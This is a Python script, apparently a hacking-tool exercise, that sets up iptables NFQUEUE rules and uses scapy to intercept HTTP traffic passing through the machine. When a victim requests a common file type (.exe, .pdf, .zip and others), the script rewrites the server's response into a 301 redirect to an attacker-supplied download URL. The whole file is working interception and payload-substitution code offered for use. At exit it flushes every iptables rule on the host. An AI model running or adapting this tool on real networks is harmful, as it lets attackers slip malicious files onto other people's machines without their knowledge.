#!/usr/bin/python3
try:
    print("[>] Importing required modules")
    import scapy.all as scapy
    import netfilterqueue
    import subprocess
    import argparse
except ModuleNotFoundError:
    print("[!] Missing modules, Exiting...")
    exit()
else:
    print("[>] Modules successfully imported")

########################################################################
# User Defined functions
########################################################################

def nothing():
    
    """I said Nothing ;)"""

    pass

def is_root():
    
    """This function will check whether the script was run as root or not"""

    current_user_id = int(subprocess.check_output(["id","-u"]))
    if current_user_id == 0:
        return True
    else:
        return False

def get_arguments():

    """This function will parse arguments from command line and return"""

    parser = argparse.ArgumentParser(description="All arguments are optional")
    parser.add_argument("-f","--filetype",help="File type to target for (.exe for example), uses some common filetypes if not provided",dest="filetype")
    parser.add_argument("-r","--replace",help="Direct download URL for the file that would be replaced with original",dest="replace")
    parser.add_argument("-io","--inout",help="This argument will order the program to intercept files from INPUT and OUTPUT chain (Packets of your computer) rather than FORWARD chain",dest='io',action='store_true')
    parser.add_argument("-s","--silent",help="Show less output",dest="mute",action="store_true")
    parser.add_argument("-d","--display",help="Display the contents of packet before and after intercepting, (Just for depth analysis, can clutter your screen with enormous output)",action="store_true",dest="display")
    
    options = parser.parse_args()
    return options.filetype, options.replace, options.io, options.mute, options.display

def check_packet(packet):

    """This function will be called on HTTP requests to check for request for a file"""

    # Check the packet for file formats
    for file_format in file_formats:
        # If a file format request exists in the packet
        if file_format in str(packet[scapy.Raw].load):
            # Add it to the record
            acknowledge_list.append(packet[scapy.TCP].ack)
            return file_format

def modify_packet(packet):

    """This function will be called when a response to a requested file will be discovered. It
       will manipulate the response"""

    acknowledge_list.remove(packet[scapy.TCP].seq)
    packet[scapy.Raw].load = f"HTTP/1.1 301 Moved Permanently\nLocation: {replace_url}\n"
    # Removing the checksums
    try:
        del packet[scapy.IP].len
        del packet[scapy.IP].chksum
        del packet[scapy.TCP].chksum
    except:
        pass
    # Return the modified packet
    return packet

def process_packet(packet):

    """This function will be called on every packet in the queue, it will process the packets"""

    # Convert the packet into scapy packet
    scapy_packet = scapy.IP(packet.get_payload())
    # Check if the packet has Raw layer
    if scapy_packet.haslayer(scapy.Raw):
        try:
            # to check the packet fields to determine
            # HTTP request
            if scapy_packet[scapy.TCP].dport == 80:
                discovered_file_format = check_packet(scapy_packet)
                if discovered_file_format:
                    print(f"[+] Interceptable {discovered_file_format} found")
            # HTTP response
            elif scapy_packet[scapy.TCP].sport == 80:
                # If it is a response to a recorded file request
                if scapy_packet[scapy.TCP].seq in acknowledge_list:
                    # Intercept and manipulate it and set it to original packet
                    print("[+] Intercepting file")
                    print(f"[>] Original response : {scapy_packet.show()}") if display_intercepted_packets else nothing()
                    modified_packet = modify_packet(scapy_packet)
                    print(f"[>] Manipulated response : {modified_packet.show()}") if display_intercepted_packets else nothing()
                    packet.set_payload(bytes(modified_packet))
        except IndexError:
            # If these fields doesn't exist
            pass
    # Let it go
    packet.accept()

########################################################################
# The main function
########################################################################

# Global
acknowledge_list = [] # Variable to store the ACK of file requesuts

# Getting arguments from command line
target_filetype, replace_url, io_chain, mute, display_intercepted_packets = get_arguments()

# Checking for root privileges
if is_root():
    nothing()
else:
    print("[!] Please run the script as root")
    exit()

# Checking and validating provided arguments
file_formats = [target_filetype] if target_filetype else [".exe", ".pdf", ".zip", ".doc", ".jpg", ".mp4"]
while not replace_url:
    print() # Line break
    replace_url = input("[>] Enter the direct downloadable link/URL of the replace file : ")
display_intercepted_packets = True if display_intercepted_packets else False
io_chain = True if io_chain else False
mute = True if mute else False

# Feedback
print() if not mute else nothing()
print(f"[>] Filetype/s to target : {file_formats}") if not mute else nothing()
print(f"[>] Replace file URL : {replace_url}") if not mute else nothing()
print(f"[>] Display intercepted packets : {display_intercepted_packets}") if not mute else nothing()

# Creating the queue
print()
print("[+] Creating a queue") if not mute else nothing()
if io_chain:
    subprocess.call("iptables -I INPUT -j NFQUEUE --queue-num 1",shell=True)
    subprocess.call("iptables -I OUTPUT -j NFQUEUE --queue-num 1",shell=True)
else:
    subprocess.call("iptables -I FORWARD -j NFQUEUE --queue-num 1",shell=True)

# Binding with the queue
queue = netfilterqueue.NetfilterQueue()
queue.bind(1,process_packet)
print("[+] Queue created and binded with program")
print() if not mute else nothing()

# Running the queue
try:
    queue.run()
except KeyboardInterrupt:
    print("[+] Unbinding the queue")
    queue.unbind()

# Flushing the ip tables and exiting
print("[+] Flushing IP tables")
subprocess.call("iptables --flush",shell=True)